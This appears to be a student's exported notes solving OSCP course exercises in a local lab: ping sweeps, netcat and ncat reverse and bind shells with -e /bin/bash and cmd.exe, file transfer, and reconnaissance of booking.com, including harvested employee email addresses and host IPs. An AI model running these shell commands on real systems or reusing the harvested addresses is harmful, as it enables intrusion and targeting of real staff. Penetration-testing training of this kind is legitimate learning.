<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 6.13.1 (455785)"/><meta name="keywords" content="OSCP, OSCP_Report"/><meta name="author" content="Anas"/><meta name="created" content="2018-01-03 17:14:02 +0000"/><meta name="source" content="desktop.win"/><meta name="source-application" content="evernote.win32"/><meta name="updated" content="2018-01-09 13:11:12 +0000"/><title>PWK course exercises solutions</title></head><body><div><div><div style="text-align: center;"><span style="font-size: 24pt;">OSCP course exercises solutions</span></div><div style="text-align: center;"><font style="font-size: 11pt;"><span style="font-size: 11pt; font-style: italic;">(For all those exercises I used two local virtual machines in my local laptop - this is why you will find that IPs are different form what is on my PWK lap)</span></font></div><div><hr/></div><div><span style="font-size: 11pt;">1.4.3. Exercises</span></div><div><ol><li><span style="font-size: 11pt;">Research Bash loops and write a short script to perform a ping sweep of your current subnet. &nbsp;&nbsp;</span></li></ol></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font color="#FF0000"><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">root@kali:~# for i in 192.168.1.{1..255}; do ping -c 1 $i; done | grep -i 'bytes from' | cut -d " " -f4 | cut -d ":" -f1</font></span></font></div></div><div><br/></div><div><ol start="2"><li><span style="font-size: 11pt;">Try to do the above exercise with a higherLlevel scripting language such as Python, Perl, or Ruby.</span></li></ol></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font face="Monaco" style="font-size: 11pt;"># &nbsp;&nbsp;<span style="font-family: Monaco; color: rgb(51, 51, 51);">/usr/bin/python3</span></font></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">import subprocess</font></span></div><div><br style="font-family: Monaco; color: rgb(51, 51, 51);"/></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">for i in range(1, 255):</font></span></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip = '192.168.1.' + str(i)</font></span></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ping = subprocess.Popen(["/bin/ping", "-c 1", "-W 1", ip], stdout=subprocess.PIPE).stdout.read()</font></span></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if 'bytes from' in str(ping) :</font></span></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print (ip)</font></span></div></div><div><br/></div><div><hr/><hr/><div><span style="font-size: 11pt;">2.1.5&nbsp;&nbsp; Exercises&nbsp;&nbsp;(Reporting is not required for these exercises)</span></div></div><ul><li><span style="font-size: 11pt;">Implement a simple chat between your Kali and Windows systems</span></li></ul><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;">root@kali:~# nc -nv 192.168.1.11 4444</font></div><div><font style="font-size: 11pt;">(UNKNOWN) [192.168.1.11] 4444 (?) open</font></div><div><font style="font-size: 11pt;">Hello Mr Windows</font></div><div><font style="font-size: 11pt;">Hello Mr Linu</font></div></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;"><font>C:\Users\IEUser&gt;C:\Users\IEUser\Downloads\netcat\nc.exe -</font>nlvp 4444</font></div><div><font style="font-size: 11pt;">listening on [any] 4444 ...</font></div><div><font style="font-size: 11pt;">connect to [192.168.1.11] from (UNKNOWN) [192.168.1.8] 50504</font></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">Hello Mr Windows</font></span></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">Hello Mr Linux</font></span></div></div><div><br/></div><ul><li><span style="font-size: 11pt;">Practice using Netcat to create the following:</span></li><ul><li><span style="font-size: 11pt;">Reverse shell from Kali to Windows</span></li></ul></ul><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;">C:\Users\IEUser&gt;C:\Users\IEUser\Downloads\netcat\nc.exe -nvlp 4444</font></div><div><font style="font-size: 11pt;">listening on [any] 4444 ...</font></div><div><font style="font-size: 11pt;">connect to [192.168.1.11] from (UNKNOWN) [192.168.1.8] 50514</font></div><div><font style="font-size: 11pt;">uname -a</font></div><div><font style="font-size: 11pt;">Linux kali 4.14.0-kali1-amd64 #1 SMP Debian 4.14.2-1kali1 (2017-12-04) x86_64 GNU/Linux</font></div></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;">root@kali:~# nc -nv 192.168.1.11 4444 -e /bin/bash</font></div><div><font style="font-size: 11pt;">(UNKNOWN) [192.168.1.11] 4444 (?) open</font></div></div><div><br/></div><ul><li><span style="font-size: 11pt;">Reverse shell from Windows to Kali</span></li></ul><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;">root@kali:~# nc -lnvp 4444</font></div><div><font style="font-size: 11pt;">listening on [any] 4444 ...</font></div><div><font style="font-size: 11pt;">connect to [192.168.1.8] from (UNKNOWN) [192.168.1.11] 49168</font></div><div><font style="font-size: 11pt;">Microsoft Windows [Version 6.1.7601]</font></div><div><font style="font-size: 11pt;">Copyright (c) 2009 Microsoft Corporation.&nbsp;&nbsp;&nbsp;&nbsp;All rights reserved.</font></div><div><br/></div><div><font style="font-size: 11pt;">C:\Users\IEUser&gt;ver</font></div><div><font style="font-size: 11pt;">ver</font></div><div><br/></div><div><font style="font-size: 11pt;">Microsoft Windows [Version 6.1.7601</font></div></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;">C:\Users\IEUser&gt;C:\Users\IEUser\Downloads\netcat\nc.exe -nv 192.168.1.8 4444 -e cmd.exe</font></div><div><font style="font-size: 11pt;">(UNKNOWN) [192.168.1.8] 4444 (?) open</font></div></div><div><br/></div><ul><li><span style="font-size: 11pt;">Bind shell on Kali. Use your Windows client to connect to it</span></li></ul><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;">root@kali:~# nc -nlvp 4444 -e /bin/bash</font></div><div><font style="font-size: 11pt;">listening on [any] 4444 ...</font></div><div><font style="font-size: 11pt;">connect to [192.168.1.8] from (UNKNOWN) [192.168.1.11] 4916</font></div></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;">C:\Users\IEUser&gt;C:\Users\IEUser\Downloads\netcat\nc.exe -nv 192.168.1.8 4444</font></div><div><font style="font-size: 11pt;">(UNKNOWN) [192.168.1.8] 4444 (?) open</font></div><div><font style="font-size: 11pt;">whoami</font></div><div><font style="font-size: 11pt;">root</font></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">uname -a</font></span></div><div><font style="font-size: 11pt;"><span style="font-family: Monaco; color: rgb(51, 51, 51);">Linux kali 4.14.0-kali1-amd64 #1 SMP Debian 4.14.2-1kali1 (2017-12-04) x86_64 GN</span><span style="font-family: Monaco;">U/Linux</span></font></div></div><div><br/></div><ul><li><span style="font-size: 11pt;">Bind shell on Windows. Use your Kali system to connect to it</span></li></ul><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;">C:\Users\IEUser&gt;C:\Users\IEUser\Downloads\netcat\nc.exe -nvlp 4444 -e cmd.exe</font></div><div><font style="font-size: 11pt;">listening on [any] 4444 ...</font></div><div><font style="font-size: 11pt;">connect to [192.168.1.11] from (UNKNOWN) [192.168.1.8] 50512</font></div></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;">root@kali:~# nc -nv 192.168.1.11 4444</font></div><div><font style="font-size: 11pt;">(UNKNOWN) [192.168.1.11] 4444 (?) open</font></div><div><font style="font-size: 11pt;">Microsoft Windows [Version 6.1.7601]</font></div><div><font style="font-size: 11pt;">Copyright (c) 2009 Microsoft Corporation.&nbsp;&nbsp;&nbsp;&nbsp;All rights reserved.</font></div><div><br/></div><div><font style="font-size: 11pt;">C:\Users\IEUser&gt;ver</font></div><div><font style="font-size: 11pt;">ver</font></div><div><br/></div><div><font style="font-size: 11pt;">Microsoft Windows [Version 6.1.7601]</font></div></div><div><br/></div><ul><li><span style="font-size: 11pt;">Transfer a file from your Kali system to Windows and vice versa</span></li></ul><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;">root@kali:~# nc -lnvp 4444 &gt; /tmp/comming_frm_win.txt</font></div><div><font style="font-size: 11pt;">listening on [any] 4444 ...</font></div><div><font style="font-size: 11pt;">connect to [192.168.1.8] from (UNKNOWN) [192.168.1.11] 49171</font></div><div><font style="font-size: 11pt;">^C</font></div><div><font style="font-size: 11pt;">root@kali:~# cat /tmp/comming_frm_win.txt</font></div><div><font style="font-size: 11pt;">Take this kali from windows</font></div></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;">C:\Users\IEUser&gt;C:\Users\IEUser\Downloads\netcat\nc.exe -nv 192.168.1.8 4444 &lt; "C:\Users\IEUser\Desktop\New Text Document.txt"</font></div><div><font style="font-size: 11pt;">(UNKNOWN) [192.168.1.8] 4444 (?) open</font></div></div><div><br/></div><ul><li><span style="font-size: 11pt; color: rgb(255, 0, 0); font-weight: bold; text-decoration: underline;">TODO</span><span style="font-size: 11pt; color: rgb(255, 0, 0); font-weight: bold; text-decoration: underline;">:</span> <span style="font-size: 11pt;">Conduct the exercises again, with the firewall enabled on your Windows host.&nbsp;&nbsp;Adapt the exercises as necessary to work around the firewall protection.&nbsp;&nbsp;Understand what portions of the exercise can no longer be completed&nbsp;&nbsp;successfully.</span></li></ul><div><br/></div><div><hr/><div><span style="font-size: 11pt;">2.2.1&nbsp;&nbsp; Exercises</span></div></div><div><ul><li><span style="font-size: 11pt;">&nbsp;&nbsp;Use Ncat to create an encrypted reverse shell from your Windows system to your Kali machine</span></li></ul><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">root@kali:~# ncat -nlvp 4444 --ssl --allow 192.168.1.11</font></span></div><div><font style="font-size: 11pt;"><span style="font-family: Monaco; color: rgb(51, 51, 51);">Ncat: Version 7.60 (</span> <a href="https://nmap.org/ncat" style="font-family: Monaco; color: rgb(51, 51, 51);">https://nmap.org/ncat</a> <span style="font-family: Monaco; color: rgb(51, 51, 51);">)</span></font></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.</font></span></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">Ncat: SHA-1 fingerprint: C22C B502 6D47 6641 F30E 14F7 C656 021F 0AB9 C82E</font></span></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">Ncat: Listening on :::4444</font></span></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">Ncat: Listening on 0.0.0.0:4444</font></span></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">Ncat: Connection from 192.168.1.11.</font></span></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">Ncat: Connection from 192.168.1.11:49209.</font></span></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">Microsoft Windows [Version 6.1.7601]</font></span></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">Copyright (c) 2009 Microsoft Corporation.&nbsp;&nbsp;&nbsp;&nbsp;All rights reserved.</font></span></div><div><br style="font-family: Monaco; color: rgb(51, 51, 51);"/></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">C:\Users\IEUser&gt;ver</font></span></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">ver</font></span></div><div><br style="font-family: Monaco; color: rgb(51, 51, 51);"/></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">Microsoft Windows [Version 6.1.7601]</font></span></div></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-family: Monaco;"><font style="font-size: 11pt;">C:\Users\IEUser&gt;C:\Users\IEUser\Downloads\Ncat\ncat.exe --exec cmd.exe -vn 192.168.1.8 4444 --ssl</font></span></div><div><font style="font-size: 11pt;"><span style="font-family: Monaco; color: rgb(51, 51, 51);">Ncat: Version 5.59BETA1 (</span> <a href="http://nmap.org/ncat" style="font-family: Monaco; color: rgb(51, 51, 51);">http://nmap.org/ncat</a> <span style="font-family: Monaco; color: rgb(51, 51, 51);">)</span></font></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">Ncat: SSL connection to 192.168.1.8:4444.</font></span></div><div><span style="font-family: Monaco; color: rgb(51, 51, 51);"><font style="font-size: 11pt;">Ncat: SHA-1 fingerprint: C22C B502 6D47 6641 F30E 14F7 C656 021F 0AB9 C82E</font></span></div><div><br style="font-family: Monaco; color: rgb(51, 51, 51);"/></div></div><div><br/></div><ul><li><span style="font-size: 11pt;">Create an encrypted bind shell on your Windows VM. Try to connect to it from Kali without encryption. Does it still work?</span></li></ul><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;">C:\Users\IEUser&gt;C:\Users\IEUser\Downloads\Ncat\ncat.exe --exec cmd.exe -vln 4444 --ssl --allow 192.168.1.8</font></div><div><font style="font-size: 11pt;">Ncat: Version 5.59BETA1 ( <a href="http://nmap.org/ncat" style="color: rgb(0, 0, 0);">http://nmap.org/ncat</a> )</font></div><div><font style="font-size: 11pt;">Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.</font></div><div><font style="font-size: 11pt;">Ncat: SHA-1 fingerprint: 75EE 206A 9DE9 98B2 DF12 6A95 4111 AB2E C4C7 B380</font></div><div><font style="font-size: 11pt;">Ncat: Listening on 0.0.0.0:4444</font></div><div><font style="font-size: 11pt;">Ncat: Connection from 192.168.1.8:50526.</font></div><div><font style="font-size: 11pt;">Ncat: Failed SSL connection from 192.168.1.8: error:140760FC:SSL routines:SSL23_GET_CLIENT_HELLO:unknown protocol</font></div></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;">root@kali:~# ncat -nv 192.168.1.11 4444</font></div><div><font style="font-size: 11pt;">Ncat: Version 7.60 ( <a href="https://nmap.org/ncat" style="color: rgb(0, 0, 0);">https://nmap.org/ncat</a> )</font></div><div><font style="font-size: 11pt;">Ncat: Connected to 192.168.1.11:4444.</font></div><div><font style="font-size: 11pt;">ver</font></div><div><font style="font-size: 11pt;">ifconfig</font></div><div><font style="font-size: 11pt;">Ncat: Connection reset by peer.</font></div></div><div><span style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span> <span style="background-color: rgb(255, 250, 165);font-size: 11pt;-evernote-highlight:true;">It gave an error and did not work.</span></div><div><span style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></div><ul><li><span style="font-size: 11pt;">Make an unencrypted Ncat bind shell on your Windows system. Connect to the shell using Netcat. Does it work?</span></li></ul></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;">C:\Users\IEUser>C:\Users\IEUser\Downloads\Ncat\ncat.exe --exec cmd.exe -vln 4444&nbsp;&nbsp;&nbsp;&nbsp;--allow 192.168.1.8</font></div><div><font style="font-size: 11pt;">Ncat: Version 5.59BETA1 ( <a href="http://nmap.org/ncat" style="color: rgb(0, 0, 0);">http://nmap.org/ncat</a> )</font></div><div><font style="font-size: 11pt;">Ncat: Listening on 0.0.0.0:4444</font></div><div><font style="font-size: 11pt;">Ncat: Connection from 192.168.1.8:50530.</font></div></div></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;">root@kali:~# nc -nv 192.168.1.11 4444</font></div><div><font style="font-size: 11pt;">(UNKNOWN) [192.168.1.11] 4444 (?) open</font></div><div><font style="font-size: 11pt;">Microsoft Windows [Version 6.1.7601]</font></div><div><font style="font-size: 11pt;">Copyright (c) 2009 Microsoft Corporation.&nbsp;&nbsp;&nbsp;&nbsp;All rights reserved.</font></div><div><br/></div><div><font style="font-size: 11pt;">C:\Users\IEUser&gt;ver</font></div><div><font style="font-size: 11pt;">ver</font></div><div><br/></div><div><font style="font-size: 11pt;">Microsoft Windows [Version 6.1.7601]</font></div><div><br/></div><div><font style="font-size: 11pt;">C:\Users\IEUser&gt;</font></div></div><div><span style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span> <span style="background-color: rgb(255, 250, 165);font-size: 11pt;-evernote-highlight:true;">Yes, now it works.</span></div><div><hr/></div><div><font style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(255, 0, 0); font-weight: bold; text-decoration: underline;">TODO:</span></font></div><div><span style="font-size: 11pt;">2.3.5 Exercises</span></div><div><span style="font-size: 11pt;">1. Use Wireshark to capture the network activity of Netcat connecting to port 1&nbsp;&nbsp;(POP3) and attempting a login.</span></div><div><span style="font-size: 11pt;">2. Read and understand the output. Where is the session threeLway handshak&nbsp;&nbsp;Where is the session closed?</span></div><div><span style="font-size: 11pt;">3. Follow the TCP stream to read the login attempt.</span></div><div><span style="font-size: 11pt;">4. Use the display filter to only see the port 110 traffic</span></div><div><span style="font-size: 11pt;">5. Rerun the capture, this time using the capture filter to only collect port 110</span></div><div><hr/></div><div><span style="font-size: 11pt; color: rgb(255, 0, 0); font-weight: bold; text-decoration: underline;">TODO:</span></div><div><span style="font-size: 11pt;">2.4.3 Exercises</span></div><div><span style="font-size: 11pt;">1. Use tcpdump to recreate the wireshark exercise of capturing traffic on port 110.</span></div><div><span style="font-size: 11pt;">2. Use the LX flag to view the content of the packet. If data is truncated, investigate&nbsp;&nbsp;how the Ls flag might help.</span></div><div><hr/><hr/><div><span style="font-size: 11pt;">3.1.3&nbsp;&nbsp; Exercises</span></div></div><div><span style="font-size: 11pt;">1. Choose an organization and use Google to gather as much information as&nbsp;&nbsp;possible about it</span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><a href="https://www.google.com.eg/search?q=site:booking.com" style="font-family: Monaco; color: rgb(0, 0, 238); text-decoration: underline;"><font style="font-size: 11pt;">https://www.google.com.eg/search?q=site:booking.com</font></a></div></div><div><span style="font-size: 11pt;">2. Use the Google filetype search operator and look for interesting documents from&nbsp;&nbsp;the target organization</span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><a href="https://www.google.com.eg/search?q=site:booking.com%20filetype:pdf"><font style="font-size: 11pt;">https://www.google.com.eg/search?q=site:booking.com%20filetype:pdf</font></a></div></div><div><hr/></div><div><span style="font-size: 11pt;">3.2.1 Exercise</span></div><div><span style="font-size: 11pt;">1. Use</span> <span style="font-size: 11pt; color: rgb(0, 0, 0);">theharvester</span> <span style="font-size: 11pt;">to enumerate email addresses belonging to the organization&nbsp;&nbsp;you chose in the previous exercises</span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;">root@kali:~# theharvester -d <a href="http://booking.com/">booking.com</a> -b all -l 10</font></div><div><font style="font-size: 11pt;">Full harvest..</font></div><div><font style="font-size: 11pt;">[-] Searching in Google..</font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Searching 0 results...</font></div><div><font style="font-size: 11pt;">[-] Searching in PGP Key server..</font></div><div><font style="font-size: 11pt;">[-] Searching in Bing..</font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Searching 50 results...</font></div><div><font style="font-size: 11pt;">[-] Searching in Exalead..</font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Searching 50 results...</font></div><div><br/></div><div><font style="font-size: 11pt;">[+] Emails found:</font></div><div><font style="font-size: 11pt;">------------------</font></div><div><a href="mailto:Raphael.Theberge@booking.com"><font style="font-size: 11pt;">Raphael.Theberge@booking.com</font></a></div><div><a href="mailto:abdellah.bentaybi@ke-booking.com"><font style="font-size: 11pt;">abdellah.bentaybi@ke-booking.com</font></a></div><div><a href="mailto:allen.morris@booking.com"><font style="font-size: 11pt;">allen.morris@booking.com</font></a></div><div><a href="mailto:anders.breindahl@booking.com"><font style="font-size: 11pt;">anders.breindahl@booking.com</font></a></div><div><a href="mailto:andrei.grechkin@booking.com"><font style="font-size: 11pt;">andrei.grechkin@booking.com</font></a></div><div><a href="mailto:ankit.bhatnagar@booking.com"><font style="font-size: 11pt;">ankit.bhatnagar@booking.com</font></a></div><div><a href="mailto:antonio.rabena@booking.com"><font style="font-size: 11pt;">antonio.rabena@booking.com</font></a></div><div><font style="font-size: 11pt;">.</font></div><div><font style="font-size: 11pt;">.</font></div><div><font style="font-size: 11pt;">.</font></div><div><a href="mailto:tom.rathborne@booking.com"><font style="font-size: 11pt;">tom.rathborne@booking.com</font></a></div><div><a href="mailto:wijnand.modderman@booking.com"><font style="font-size: 11pt;">wijnand.modderman@booking.com</font></a></div><div><a href="mailto:willem.gerber@booking.com"><font style="font-size: 11pt;">willem.gerber@booking.com</font></a></div><div><a href="mailto:wouter.clarie@booking.com"><font style="font-size: 11pt;">wouter.clarie@booking.com</font></a></div><div><a href="mailto:wouter.teepe@booking.com"><font style="font-size: 11pt;">wouter.teepe@booking.com</font></a></div><div><br/></div><div><font style="font-size: 11pt;">[+] Hosts found in search engines:</font></div><div><font style="font-size: 11pt;">------------------------------------</font></div><div><font style="font-size: 11pt;">[-] Resolving hostnames IPs...</font></div><div><font style="font-size: 11pt;">37.10.0.220:<a href="http://www.booking.com/">Www.booking.com</a></font></div><div><font style="font-size: 11pt;">5.57.17.51:<a href="http://admin.booking.com/">admin.booking.com</a></font></div><div><font style="font-size: 11pt;">5.57.17.220:<a href="http://www.booking.com/">www.booking.com</a></font></div><div><font style="font-size: 11pt;">[+] Virtual hosts:</font></div><div><font style="font-size: 11pt;">==================</font></div></div><div><span style="font-size: 11pt;">2. Experiment with different data sources (</span><span style="font-size: 11pt; color: rgb(0, 0, 0);">-b</span><span style="font-size: 11pt;">). Which work best for you?</span></div><blockquote style="margin: 0 0 0 40px; border: none; padding: 0px;"><div><span style="background-color: rgb(255, 250, 165);-evernote-highlight:true;"><span style="background-color: rgb(255, 250, 165);font-size: 11pt;-evernote-highlight:true;">`-b all` is giving the best results (of course&nbsp;&nbsp;😃 )</span></span></div></blockquote><hr/><div><span style="font-size: 11pt;">3.3.3 Exercise</span></div><div><span style="font-size: 11pt;">1. Use the</span> <span style="font-size: 11pt; color: rgb(0, 0, 0);">whois</span> <span style="font-size: 11pt;">tool in Kali to identify the name servers of your target organization</span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid 